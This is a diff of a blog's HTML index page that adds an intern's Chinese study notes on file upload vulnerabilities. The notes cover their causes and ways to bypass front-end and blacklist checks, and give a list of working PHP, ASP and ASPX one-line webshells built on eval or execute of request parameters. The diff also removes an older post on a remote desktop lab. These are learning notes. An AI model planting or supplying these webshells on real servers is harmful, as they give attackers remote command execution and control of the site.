@@ -48,6 +48,62 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-12-19" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/19/12-19/">12.19实习所学</a>
+    </h1>
+  
+
+        <div class="article-meta">
+          <a href="/2023/12/19/12-19/" class="article-date">
+  <time datetime="2023-12-19T02:16:39.000Z" itemprop="datePublished">2023-12-19</time>
+</a>
+          
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="什么是文件上传漏洞？"><a href="#什么是文件上传漏洞？" class="headerlink" title="什么是文件上传漏洞？"></a>什么是文件上传漏洞？</h3><p>​	文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以时木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
+<h4 id="什么是webshell"><a href="#什么是webshell" class="headerlink" title="什么是webshell"></a>什么是webshell</h4><p>​	WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的(可以上传下载或者修改文件，操作数据库，执行任意命令等)。WebShell后门隐蔽高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录</p>
+<h4 id="产生文件上传漏洞的原因"><a href="#产生文件上传漏洞的原因" class="headerlink" title="产生文件上传漏洞的原因"></a>产生文件上传漏洞的原因</h4><ul>
+<li>​	对于上传文件的后缀名(扩展名)没有做较为严格的限制</li>
+<li>​    对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法)没有做检查</li>
+<li>​    权限上没有对于上传的文件目录设置不可执行权限，(尤其时对于shebang类型的文件)</li>
+<li>​    对于web server对于上传文件火鹤指定目录的行为没有做限制</li>
+</ul>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul>
+<li>​	上传网站后门文件(获取webshell)</li>
+</ul>
+<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="前端js类绕过"><a href="#前端js类绕过" class="headerlink" title="前端js类绕过"></a>前端js类绕过</h5><ul>
+<li>​		页面直接修改js上传文件方法(添加类型等</li>
+<li>​        抓包改包，将上传的文件后缀进行修改;  (比如：a.jsp.jpg文件抓包修改为a.jsp)</li>
+<li>​        复制页面，重新构建新页面，获取方法，并修改</li>
+</ul>
+<h5 id="后端黑名单绕过"><a href="#后端黑名单绕过" class="headerlink" title="后端黑名单绕过"></a>后端黑名单绕过</h5><p>​		Web系统可能会采用黑名单的方式进行过滤。而过滤的方式存在一定的缺陷，比如存在过滤的黑名单不全，没考虑大小写，以及要上传文件的名称存在敏感字符。基于黑名单后缀验证，只针对黑名单中没有的后缀名，文件才能上传成功。</p>
+<h4 id="一句话木马大全"><a href="#一句话木马大全" class="headerlink" title="一句话木马大全"></a>一句话木马大全</h4><p>​	常用的webshell就是一句话木马，结合中国菜刀或者hackbar等工具可以很搞笑快捷的获得网站shell。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##PHP：</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;r00ts&#x27;</span>]);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_REQUEST</span>[cmd]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">##ASP</span><br><span class="line">&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; </span><br><span class="line"></span><br><span class="line">&lt;%execute(request(“1″))%&gt; </span><br><span class="line"></span><br><span class="line">&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用&#x27;&lt;,&gt;‘的asp一句话 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">##aspx</span><br><span class="line">&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+  </div>
+ 
+</article>
+
+
+  
     <article id="post-12-18" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -641,57 +697,6 @@
 <p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231205193327863.png" alt="image-20231205193327863"></p>
 <p>5.从pc1 ping 192.168.3.10，验证路由配置成功</p>
 <p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231205193508736.png" alt="image-20231205193508736"></p>
-
-      
-    </div>
-  </div>
- 
-</article>
-
-
-  
-    <article id="post-12-4" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/04/12-4/">12.4实习所学</a>
-    </h1>
-  
-
-        <div class="article-meta">
-          <a href="/2023/12/04/12-4/" class="article-date">
-  <time datetime="2023-12-04T09:42:50.000Z" itemprop="datePublished">2023-12-04</time>
-</a>
-          
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="一、一些基础理论"><a href="#一、一些基础理论" class="headerlink" title="一、一些基础理论"></a>一、一些基础理论</h2><p>1.ip(公网ip、私网ip划分、子网掩码计算)。</p>
-<p>2.windows配置ip，ipconfig命令的用法，还学会了windows一些常用的操作指令，如：net user指令。</p>
-<p>3.了解了防火墙是什么，了解dmz在内的三个区域，了解acl访问控制列表(不需要会配置)，了解windows入站和出站配置（在远程桌面控制小实验中用到）。</p>
-<h2 id="二、远程桌面控制实验"><a href="#二、远程桌面控制实验" class="headerlink" title="二、远程桌面控制实验"></a>二、远程桌面控制实验</h2><p>1、首先查看ip</p>
-<p>首先在桌面同时按住win+r键，键盘输入cmd回车，输入命令ipconfig，找到ip地址</p>
-<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231208132212713.png"></p>
-<p>2、右键 计算机 选择属性，点击远程设置，在远程协助框中勾选 允许远程协助连接这台计算机，在远程桌面勾选 允许远程连接到此计算机 并勾选下面的复选框 如下图所示</p>
-<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231208132606087.png" alt="image-20231208132606087"></p>
-<p>此时控制端的设置就已经完毕</p>
-<p>3、控制端：<br>在桌面同时按住win+r打开运行，输入 mstsc</p>
-<p>回车打开 远程桌面连接 ，点击常规，在 计算机 位置输入 被控制端的ip地址</p>
-<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231208132717126.png" alt="image-20231208132717126"></p>
-<p>点击连接即可，会弹出对话框</p>
-<p>用户名和密码必需输入被控制电脑的系统管理员，即可实现连接</p>
-<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231208132856102.png" alt="image-20231208132856102"></p>
-<p>4.在被控制端添加入站规则</p>
-<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231208133151012.png" alt="image-20231208133151012"></p>
-<p>连接失败，同理在控制端添加出站规则也会连接失败。</p>
-<p><img src="https://raw.githubusercontent.com/zjh3515/imagee/main/image-20231208133258418.png" alt="image-20231208133258418"></p>
 
       
     </div>
